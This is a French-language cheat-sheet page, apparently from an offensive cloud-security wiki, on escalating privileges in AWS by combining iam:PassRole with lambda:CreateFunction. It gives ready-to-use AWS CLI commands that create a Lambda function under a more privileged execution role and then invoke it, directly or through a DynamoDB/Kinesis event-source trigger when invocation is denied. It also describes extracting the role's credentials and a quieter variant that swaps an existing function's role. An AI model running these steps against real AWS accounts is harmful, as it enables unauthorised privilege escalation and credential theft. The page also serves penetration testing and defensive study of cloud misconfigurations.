---
title: "Lambda : PassRole vers CreateFunction pour un rôle d'exécution privilégié"
description: "iam:PassRole combiné à lambda:CreateFunction et à l'invocation pour exécuter du code attaquant sous un rôle d'exécution Lambda privilégié."
keywords:
  - PassRole
  - Lambda
  - CreateFunction
  - execution role
  - InvokeFunction
---

# Lambda

Avec `iam:PassRole` et `lambda:CreateFunction` (plus `lambda:InvokeFunction`), vous créez une fonction dont le **rôle d'exécution** est plus privilégié que le vôtre, puis vous l'invoquez. Le corps de la fonction est votre code : il s'exécute donc avec les identifiants du rôle transmis, disponibles dans le runtime via l'environnement du rôle.

## Créer et invoquer

```bash
# zip a handler that calls sts:get-caller-identity or does your work
aws lambda create-function \
  --function-name x --runtime python3.12 --handler h.handler \
  --role arn:aws:iam::<acct>:role/<privileged-role> \
  --zip-file fileb://f.zip
aws lambda invoke --function-name x out.json ; cat out.json
```

Le handler peut lire `boto3.Session().get_credentials()` pour extraire les clés du rôle, ou tout simplement réaliser directement l'action privilégiée.

## Forcer l'exécution avec un déclencheur de flux

Lorsque `lambda:InvokeFunction` est refusé mais que `lambda:CreateEventSourceMapping` est autorisé, rattachez la fonction à un flux DynamoDB ou Kinesis sur lequel vous pouvez écrire : un enregistrement sur le flux déclenche l'invocation sous le rôle d'exécution, de sorte que vous n'appelez jamais l'invocation directement.

```bash
aws lambda create-function --function-name x --runtime python3.12 --handler h.handler \
  --role arn:aws:iam::<acct>:role/<privileged-role> --zip-file fileb://f.zip
aws lambda create-event-source-mapping --function-name x \
  --event-source-arn arn:aws:dynamodb:<region>:<acct>:table/<t>/stream/<ts> --starting-position LATEST
# writing an item to the table now triggers the function as the passed role
```

## Notes d'exploitation

- La politique de confiance du rôle cible doit autoriser `lambda.amazonaws.com`, ce qui est standard pour tout rôle conçu comme rôle d'exécution Lambda.
- `lambda:UpdateFunctionConfiguration` sur une fonction existante permet également de remplacer son rôle par un que vous pouvez transmettre, une variante plus discrète que la création d'une nouvelle fonction.
- Aucun accès réseau entrant n'est nécessaire : l'invocation est un appel d'API, et les résultats reviennent dans la charge utile de la réponse.

## Outils

- **AWS CLI** (`lambda create-function` / `invoke`) : le chemin complet.
- **Pacu** (`lambda__backdoor_new_roles`, modules privesc) : automatise l'escalade fondée sur les fonctions.

## Références

- [Rhino Security Labs : élévation de privilèges AWS (PassRole vers Lambda)](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [BishopFox : iam-vulnerable](https://github.com/BishopFox/iam-vulnerable)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
- [Hacking the Cloud : AWS](https://hackingthe.cloud/)
